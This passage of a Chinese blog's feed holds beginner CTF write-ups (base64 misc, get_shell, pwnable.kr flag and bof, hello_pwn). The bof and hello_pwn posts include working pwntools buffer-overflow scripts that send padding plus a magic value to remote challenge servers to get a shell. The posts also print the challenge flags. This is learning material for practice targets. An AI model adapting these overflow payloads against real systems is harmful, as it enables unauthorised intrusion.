alt="image-20211106232802773"></p><p>得到flag.txt</p><p><img src="image-20211106232839219.png" alt="image-20211106232839219"></p><p>打开看到一串字符，以 ” = “ 结尾，说明是base64加密，百度上查找base64解密即可得到flag</p><p><img src="image-20211106233059315.png" alt="image-20211106233059315"></p><p>以上是Windows中的解法，Linux下的解法以后再看写不写吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</span><br></pre></td></tr></table></figure><p><strong>SimpleRAR：</strong></p><p>下载附件，解压附件，得到flag.txt，打开看了一下⊙∀⊙！</p><p><img src="image-20211107124023951.png" alt="image-20211107124023951"></p><p><img src="image-20211107122638576.png" alt="image-20211107122638576"></p><p>然后就去百度看了一下，了解了一下解题过程</p><p><a href="https://blog.csdn.net/tqydyqt/article/details/101992518">https://blog.csdn.net/tqydyqt/article/details/101992518</a></p><p><a href="https://blog.csdn.net/xiaolong22333/article/details/107498232">https://blog.csdn.net/xiaolong22333/article/details/107498232</a></p><p>首先去<a href="http://www.winhex.com下载winhex/">www.winhex.com下载winhex</a></p><p><img src="%5Cimage-20211107122959047.png" alt="image-20211107122959047"></p><p><img src="image-20211107123042220.png" alt="image-20211107123042220"></p><p>打开winhex将本题附件压缩包拖动至winhex</p><p><img src="image-20211107123418763.png" alt="image-20211107123418763"></p><p>这里可以看到flag is not here和一个png格式的图片，</p><p><img src="image-20211107123743899.png" alt="image-20211107123743899"></p><p>接着</p><p>接着以后写</p>]]></content>
    
    
    <summary type="html">攻防世界-misc-新手区</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>get_shell</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/10/28/get-shell/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/10/28/get-shell/</id>
    <published>2021-10-28T04:28:45.000Z</published>
    <updated>2021-10-28T04:35:05.490Z</updated>
    
    <content type="html"><![CDATA[<p>首先，我们看到题目：</p><p><img src="image-20211028122944618.png" alt="image-20211028122944618"></p><p>下载附件&amp;获取场景：</p><p><img src="image-20211028122959729.png" alt="image-20211028122959729"></p><p>因为题目中说运行即可拿到shell，那我们就直接进虚拟机连接到该ip去看看</p><p>发现nc指令连不上去，之前用ssh也连不上，根本没反应,我姐说可能是防火墙的原因 </p><p><img src="image-20211028123019714.png" alt="image-20211028123019714"></p><p>那我们换个思路，写个脚本试试：</p><p><img src="image-20211028123056923.png" alt="image-20211028123056923"></p><p>运行该脚本：</p><p><img src="image-20211028123302612.png" alt="image-20211028123302612"></p><p>$ ls 查看当前目录文件，发现flag，cat一下  $ cat flag 发现能够得到flag，提交即可</p><p>flag：cyberpeace{c2414b5c0583aef5e2d7b2bbd7a98a83}</p><p><strong>拓展：</strong></p><p>但题目说运行即可拿到flag，我们并没有运行本题附件，接下来下载附件运行一下</p><p><img src="image-20211028123403958.png" alt="image-20211028123403958"></p><p>这是我/Desktop目录下的文件：</p><p><img src="image-20211028123422849.png" alt="image-20211028123422849"></p><p>显然，这个附件帮我拿到了我自己电脑的shell，所以我只能查看我自己电脑上的文件</p><p>这时我们打开ida反编译一下附件：</p><p>打开main函数后可以发现，这里直接调用了system（）函数获取shell</p><p><img src="image-20211028123450549.png" alt="image-20211028123450549"></p><p><strong>综述：</strong></p><p>本地执行本题附件只会拿到当前机器的shell，而该题的flag存在远端服务器上，并未存储在我们的个人PC上，所以我们要连接到远端服务器上，去服务器上执行该文件才能在服务器上拿到该题的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*                          <span class="comment">#导入pwn模块</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;63031&#x27;</span>)     <span class="comment">#远程连接</span></span><br><span class="line">p.interactive()                           <span class="comment">#接收服务器的交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：cyberpeace&#123;c2414b5c0583aef5e2d7b2bbd7a98a83&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">攻防世界-get_shell</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>flag</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/10/28/flag/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/10/28/flag/</id>
    <published>2021-10-28T04:17:24.000Z</published>
    <updated>2021-10-28T04:22:41.504Z</updated>
    
    <content type="html"><![CDATA[<p><strong>1：</strong>拿到题目，借助网址下载相应文件<strong>1：</strong>拿到题目，借助网址下载相应文件</p><p><img src="image-20211028121819871.png" alt="image-20211028121819871"></p><p><img src="image-20211028121841578.png" alt="image-20211028121841578"></p><p>命令1：wget <a href="http://pwnable.kr/bin/flag">http://pwnable.kr/bin/flag</a></p><p><strong>2：</strong>通过网络资料知：</p><p>  “用个16进制查看器看一下,是elf文件,并且加了upx壳,要脱下upx壳才好分析”</p><p><img src="image-20211028121911536.png" alt="image-20211028121911536"></p><p>这16进制查看器我不知道咋弄的，该图也是从网上搬来的。</p><p><strong>3：</strong>由于upx不为自带文件，需自行下载，相应Linux指令附着于下：</p><p>（1）：下载upx：命令2：</p><p>wget <a href="https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz">https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz</a></p><p>（2）：解压二进制：命令3：</p><p>tar -Jxf upx*.tar.xz</p><p>（3）：为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量：命令4：</p><p>sudo cp upx*/upx /usr/bin</p><p><strong>4：</strong>利用upx 进行解压，upx -d filename：</p><p><img src="image-20211028121940998.png" alt="image-20211028121940998"></p><p>基本操作不做过多赘述，实在不理解请自行百度查找（其实我也不理解，会用就行）</p><p>命令6：upx -d flag</p><p>5：查看文件是否下载至当前路径（我的当前路径为Desktop（桌面））：</p><p><img src="image-20211028122002870.png" alt="image-20211028122002870"></p><p>此处进行了权限赋予操作（赘余操作，可不必进行）</p><p>命令7：chmod 777 flag</p><p><strong>6：</strong>运用file命令查看flag文件的位数情况（32位 or 64位）：</p><p><img src="image-20211028122020834.png" alt="image-20211028122020834"></p><p>命令8：file flag</p><p>由此得知flag文件为64位文件</p><p><strong>7：</strong>现在只需将flag文件拖动至Windows界面中的64位ida中进行反编译即可，具体操作在此不做赘述（拖动文件会吧？不用教了吧，拖不出来的话考虑换一个虚拟机吧）</p><p><strong>8：</strong>接下来就是常规操作，按下ok，找到main函数按下F5，结果如下：</p><p><img src="image-20211028122043880.png" alt="image-20211028122043880"></p><p><strong>9：</strong>分析main函数，并无特别之处，但那flag格外显眼，经合情推理，flag内置于内存之中，这时我们只需双击flag便可进入如下界面，并发现flag地址处存储的一组字符串：</p><p><img src="image-20211028122118485.png" alt="image-20211028122118485"></p><p>UPX…? sounds like a delivery service但这并不是flag</p><p>10：双击字符串后进入另一界面，此时flag便出现了：</p><p><img src="image-20211028122203449.png" alt="image-20211028122203449"></p><p>正解flag：UPX…? sounds like a delivery service :)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">pwnable-flag</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>bof</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/10/28/bof/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/10/28/bof/</id>
    <published>2021-10-28T03:47:34.000Z</published>
    <updated>2021-10-29T14:45:06.506Z</updated>
    
    <content type="html"><![CDATA[<p>1：先看题目</p><p><img src="clip_image002.jpg" alt="clip_image002"></p><p>Windows:将地址复制粘贴至浏览器即可下载</p><p>Linux：开启root权限，使用wget指令即可下载本题文件</p><p>  $ wget <a href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a></p><p>  $ wget <a href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p><p>2：Linux下使用file指令查看bof文件信息</p><p><img src="clip_image003.png" alt="clip_image003"></p><p>32-bit可知bof文件为32位文件</p><p>3：打开32位ida，将bof二进制可执行文件拖入其中</p><p>进行一些基本操作可得到如下结果，如图</p><p>图一：main函数</p><p>图二：func函数</p><p><img src="clip_image005.jpg" alt="clip_image005"></p><p><img src="clip_image006.png" alt="clip_image006"></p><p>简要分析可知：在远端服务器执行该文件，并且当a1的值为-889275714时，即可拿到远端服务器的shell，进而得到你想要的flag，to win</p><p>5：</p><p><img src="clip_image007.png" alt="clip_image007"></p><p>Gdb打开bof文件</p><p><img src="clip_image008.png" alt="clip_image008"></p><p>在main函数处设置断点并执行文件</p><p><img src="clip_image009.png" alt="clip_image009"></p><p><img src="clip_image011.jpg" alt="clip_image011"></p><p><img src="clip_image013.jpg" alt="clip_image013"></p><p>在idamain函数中使用Hex…我们发现这两个数据相同，自己领会</p><p><img src="clip_image014.png" alt="clip_image014"></p><p>刚运行至我们设置的断点处，指针停在了这个位置</p><p><img src="clip_image015.png" alt="clip_image015"></p><p>离我们的func函数仅有三步之遥</p><p><img src="clip_image016.png" alt="clip_image016"></p><p>此时我们执行四次si指令即可进入func函数，结果如下</p><p><img src="clip_image017.png" alt="clip_image017"></p><p>查看栈段：</p><p><img src="clip_image019.jpg" alt="clip_image019"></p><p>得到内存的栈段中func函数的末尾地址0xffffd130</p><p>利用x/50wx 0xffffd130，从栈地址0xffffd130向高位打印50个内存地址（一个地址四字节）</p><p><img src="clip_image021.jpg" alt="clip_image021"></p><p>结果如上图，第一个0x61616161便是我们输入的数组s的初始值（即s[0]），0xdeadbeef即为我们main函数中的传入func的参数，因此我们只需要输入80-4c = 34（转换为十进制即为52），输入52个任意字符外加目标字符“0xCAFEBABE”即可解决此题</p><p>构造的脚本如下：</p><p><img src="clip_image022.png" alt="clip_image022"></p><p>结果如下：</p><p><img src="clip_image023.png" alt="clip_image023"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*                          <span class="comment">#导入pwn模块</span></span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)             <span class="comment">#连接远端服务器</span></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x34</span>) + p32(<span class="number">0xcafebabe</span>))  <span class="comment">#发送payload</span></span><br><span class="line">p.interactive()                           <span class="comment">#接收远端服务器交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">pwnable-bof</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界-hello_pwn</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/10/27/Note/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/10/27/Note/</id>
    <published>2021-10-27T13:56:07.000Z</published>
    <updated>2021-11-09T14:48:05.045Z</updated>
    
    <content type="html"><![CDATA[<p>首先，我们看到题目：</p><p><img src="image-20211027220220140.png" alt="image-20211027220220140"></p><p>下载附件，ida反编译并找出主函数：</p><p><img src="image-20211027224506556.png" alt="image-20211027224506556"></p><p>看到read函数，初步判断是栈溢出题</p><p>进入sub函数查看：</p><p><img src="image-20211027224643668.png" alt="image-20211027224643668"></p><p>ok，解题思路：只要能连接上服务器，并执行该文件，在与服务器交互中，输入一串payload使程序中的dword_60106C值变为1853186401后进入sub函数我们就能拿到服务器上的flag。</p><p>好的，先让我们阅读一下read（）函数，点进read（）函数中的unk_601068变量</p><p><img src="image-20211027224714446.png" alt="image-20211027224714446"></p><p>对比一下：</p><p><img src="image-20211027224732285.png" alt="image-20211027224732285"></p><p>发现这两个变量的偏移量为6C-68 = 4（16进制）</p><p>因此我们可以构造payload = ‘aaaa’+p64(1853186401)，具体脚本如下：</p><p><img src="image-20211027224758038.png" alt="image-20211027224758038"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&#x27;63031&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python gfsj1.py</span><br><span class="line">[+] Opening connection to 111.200.241.244 on port 54083: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;6a5a35ff4fd3d526fbb7a7263ec67500&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Closed connection to 111.200.241.244 port 54083</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">攻防世界-hello_pwn</summary>
    
    
    
    
  </entry>
  
</feed>
